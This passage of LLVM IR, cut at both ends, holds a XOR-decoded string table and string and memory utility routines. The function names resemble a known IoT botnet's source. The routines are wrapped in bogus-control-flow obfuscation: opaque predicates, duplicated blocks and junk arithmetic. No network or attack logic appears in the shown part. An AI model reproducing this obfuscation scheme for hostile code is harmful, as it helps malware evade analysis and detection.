  %gen2 = mul i32 %_1, %132
  %_3 = sub i32 0, %140
  %gen4 = add i32 %_3, %132
  %141 = xor i32 %140, %132
  %142 = trunc i32 %141 to i8
  store i8 %142, i8* %138, align 1
  %143 = load i8, i8* %7, align 1
  %144 = zext i8 %143 to i32
  %145 = load %struct.table_value*, %struct.table_value** %4, align 8
  %146 = getelementptr inbounds %struct.table_value, %struct.table_value* %145, i32 0, i32 0
  %147 = load i8*, i8** %146, align 8
  %148 = load i32, i32* %3, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8, i8* %147, i64 %149
  %151 = load i8, i8* %150, align 1
  %152 = sext i8 %151 to i32
  %_5 = sub i32 %152, %144
  %gen6 = mul i32 %_5, %144
  %_7 = sub i32 0, %152
  %gen8 = add i32 %_7, %144
  %_9 = sub i32 %152, %144
  %gen10 = mul i32 %_9, %144
  %_11 = shl i32 %152, %144
  %_12 = shl i32 %152, %144
  %153 = xor i32 %152, %144
  %154 = trunc i32 %153 to i8
  store i8 %154, i8* %150, align 1
  %155 = load i8, i8* %8, align 1
  %156 = zext i8 %155 to i32
  %157 = load %struct.table_value*, %struct.table_value** %4, align 8
  %158 = getelementptr inbounds %struct.table_value, %struct.table_value* %157, i32 0, i32 0
  %159 = load i8*, i8** %158, align 8
  %160 = load i32, i32* %3, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8, i8* %159, i64 %161
  %163 = load i8, i8* %162, align 1
  %164 = sext i8 %163 to i32
  %_13 = sub i32 0, %164
  %gen14 = add i32 %_13, %156
  %_15 = sub i32 0, %164
  %gen16 = add i32 %_15, %156
  %_17 = shl i32 %164, %156
  %_18 = sub i32 %164, %156
  %gen19 = mul i32 %_18, %156
  %_20 = sub i32 0, %164
  %gen21 = add i32 %_20, %156
  %_22 = sub i32 0, %164
  %gen23 = add i32 %_22, %156
  %_24 = shl i32 %164, %156
  %165 = xor i32 %164, %156
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* %162, align 1
  br label %originalBB

originalBB25alteredBB:                            ; preds = %originalBB25, %99
  %167 = load i32, i32* %3, align 4
  %_26 = sub i32 %167, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 0, %167
  %gen29 = add i32 %_28, 1
  %_30 = shl i32 %167, 1
  %_31 = sub i32 0, %167
  %gen32 = add i32 %_31, 1
  %_33 = sub i32 0, %167
  %gen34 = add i32 %_33, 1
  %_35 = shl i32 %167, 1
  %_36 = shl i32 %167, 1
  %_37 = sub i32 %167, 1
  %gen38 = mul i32 %_37, 1
  %_39 = shl i32 %167, 1
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %3, align 4
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.51
  %3 = load i32, i32* @y.52
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.51
  %17 = load i32, i32* @y.52
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.53
  %13 = load i32, i32* @y.54
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.53
  %26 = load i32, i32* @y.54
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = load i32, i32* @x.55
  %3 = load i32, i32* @y.56
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* @x.55
  %13 = load i32, i32* @y.56
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %26, %originalBBpart2
  %21 = load i8*, i8** %10, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %10, align 8
  %23 = load i8, i8* %21, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %29

; <label>:26:                                     ; preds = %20
  %27 = load i32, i32* %11, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %11, align 4
  br label %20

; <label>:29:                                     ; preds = %20
  %30 = load i32, i32* %11, align 4
  ret i32 %30

originalBBalteredBB:                              ; preds = %originalBB, %1
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  store i8* %0, i8** %31, align 8
  store i32 0, i32* %32, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strncmp(i8*, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

; <label>:17:                                     ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %38

; <label>:21:                                     ; preds = %17, %3
  %22 = load i32, i32* @x.57
  %23 = load i32, i32* @y.58
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  store i8 0, i8* %4, align 1
  %30 = load i32, i32* @x.57
  %31 = load i32, i32* @y.58
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %88

; <label>:38:                                     ; preds = %17
  br label %39

; <label>:39:                                     ; preds = %originalBBpart24, %38
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, -1
  store i32 %41, i32* %7, align 4
  %42 = icmp ne i32 %40, 0
  br i1 %42, label %43, label %71

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %5, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %5, align 8
  %46 = load i8, i8* %44, align 1
  %47 = sext i8 %46 to i32
  %48 = load i8*, i8** %6, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %6, align 8
  %50 = load i8, i8* %48, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp ne i32 %47, %51
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %43
  store i8 0, i8* %4, align 1
  br label %88

; <label>:54:                                     ; preds = %43
  %55 = load i32, i32* @x.57
  %56 = load i32, i32* @y.58
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* @x.57
  %64 = load i32, i32* @y.58
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %39

; <label>:71:                                     ; preds = %39
  %72 = load i32, i32* @x.57
  %73 = load i32, i32* @y.58
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  store i8 1, i8* %4, align 1
  %80 = load i32, i32* @x.57
  %81 = load i32, i32* @y.58
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %88

; <label>:88:                                     ; preds = %originalBBpart28, %53, %originalBBpart2
  %89 = load i8, i8* %4, align 1
  ret i8 %89

originalBBalteredBB:                              ; preds = %originalBB, %21
  store i8 0, i8* %4, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  store i8 1, i8* %4, align 1
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_strcmp(i8*, i8*) #0 {
  %3 = load i32, i32* @x.59
  %4 = load i32, i32* @y.60
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %16 = load i8*, i8** %12, align 8
  %17 = call i32 @util_strlen(i8* %16)
  store i32 %17, i32* %14, align 4
  %18 = load i8*, i8** %13, align 8
  %19 = call i32 @util_strlen(i8* %18)
  store i32 %19, i32* %15, align 4
  %20 = load i32, i32* %14, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp ne i32 %20, %21
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i8 0, i8* %11, align 1
  br label %130

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.59
  %34 = load i32, i32* @y.60
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @x.59
  %42 = load i32, i32* @y.60
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:49:                                     ; preds = %originalBBpart216, %originalBBpart24
  %50 = load i32, i32* %14, align 4
  %51 = add nsw i32 %50, -1
  store i32 %51, i32* %14, align 4
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %113

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @x.59
  %55 = load i32, i32* @y.60
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %53
  %62 = load i8*, i8** %12, align 8
  %63 = getelementptr inbounds i8, i8* %62, i32 1
  store i8* %63, i8** %12, align 8
  %64 = load i8, i8* %62, align 1
  %65 = sext i8 %64 to i32
  %66 = load i8*, i8** %13, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %13, align 8
  %68 = load i8, i8* %66, align 1
  %69 = sext i8 %68 to i32
  %70 = icmp ne i32 %65, %69
  %71 = load i32, i32* @x.59
  %72 = load i32, i32* @y.60
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %70, label %79, label %96

; <label>:79:                                     ; preds = %originalBBpart28
  %80 = load i32, i32* @x.59
  %81 = load i32, i32* @y.60
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %79
  store i8 0, i8* %11, align 1
  %88 = load i32, i32* @x.59
  %89 = load i32, i32* @y.60
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %130

; <label>:96:                                     ; preds = %originalBBpart28
  %97 = load i32, i32* @x.59
  %98 = load i32, i32* @y.60
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %96
  %105 = load i32, i32* @x.59
  %106 = load i32, i32* @y.60
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %49

; <label>:113:                                    ; preds = %49
  %114 = load i32, i32* @x.59
  %115 = load i32, i32* @y.60
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %113
  store i8 1, i8* %11, align 1
  %122 = load i32, i32* @x.59
  %123 = load i32, i32* @y.60
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %130

; <label>:130:                                    ; preds = %originalBBpart220, %originalBBpart212, %31
  %131 = load i8, i8* %11, align 1
  ret i8 %131

originalBBalteredBB:                              ; preds = %originalBB, %2
  %132 = alloca i8, align 1
  %133 = alloca i8*, align 8
  %134 = alloca i8*, align 8
  %135 = alloca i32, align 4
  %136 = alloca i32, align 4
  store i8* %0, i8** %133, align 8
  store i8* %1, i8** %134, align 8
  %137 = load i8*, i8** %133, align 8
  %138 = call i32 @util_strlen(i8* %137)
  store i32 %138, i32* %135, align 4
  %139 = load i8*, i8** %134, align 8
  %140 = call i32 @util_strlen(i8* %139)
  store i32 %140, i32* %136, align 4
  %141 = load i32, i32* %135, align 4
  %142 = load i32, i32* %136, align 4
  %143 = icmp ne i32 %141, %142
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %53
  %144 = load i8*, i8** %12, align 8
  %145 = getelementptr inbounds i8, i8* %144, i32 1
  store i8* %145, i8** %12, align 8
  %146 = load i8, i8* %144, align 1
  %147 = sext i8 %146 to i32
  %148 = load i8*, i8** %13, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %13, align 8
  %150 = load i8, i8* %148, align 1
  %151 = sext i8 %150 to i32
  %152 = icmp ne i32 %147, %151
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %79
  store i8 0, i8* %11, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %96
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %113
  store i8 1, i8* %11, align 1
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %originalBBpart2, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %37

; <label>:15:                                     ; preds = %11
  %16 = load i32, i32* @x.63
  %17 = load i32, i32* @y.64
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i8*, i8** %8, align 8
  %25 = getelementptr inbounds i8, i8* %24, i32 1
  store i8* %25, i8** %8, align 8
  %26 = load i8, i8* %24, align 1
  %27 = load i8*, i8** %7, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %7, align 8
  store i8 %26, i8* %27, align 1
  %29 = load i32, i32* @x.63
  %30 = load i32, i32* @y.64
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %11

; <label>:37:                                     ; preds = %11
  %38 = load i32, i32* @x.63
  %39 = load i32, i32* @y.64
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* @x.63
  %47 = load i32, i32* @y.64
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %54 = load i8*, i8** %8, align 8
  %55 = getelementptr inbounds i8, i8* %54, i32 1
  store i8* %55, i8** %8, align 8
  %56 = load i8, i8* %54, align 1
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %7, align 8
  store i8 %56, i8* %57, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7

; <label>:14:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* @x.67
  %23 = load i32, i32* @y.68
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 45
  %32 = load i32, i32* @x.67
  %33 = load i32, i32* @y.68
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %31, label %40, label %61

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.67
  %42 = load i32, i32* @y.68
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  store i32 1, i32* %8, align 4
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  %52 = sext i8 %51 to i32
  store i32 %52, i32* %6, align 4
  %53 = load i32, i32* @x.67
  %54 = load i32, i32* @y.68
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = load i32, i32* %6, align 4
  %63 = icmp eq i32 %62, 43
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i8*, i8** %3, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %3, align 8
  %67 = load i8, i8* %65, align 1
  %68 = sext i8 %67 to i32
  store i32 %68, i32* %6, align 4
  br label %69

; <label>:69:                                     ; preds = %64, %61
  br label %70

; <label>:70:                                     ; preds = %69, %originalBBpart24
  %71 = load i32, i32* %8, align 4
  %72 = icmp ne i32 %71, 0
  %73 = select i1 %72, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %73, i64* %7, align 8
  %74 = load i64, i64* %7, align 8
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = urem i64 %74, %76
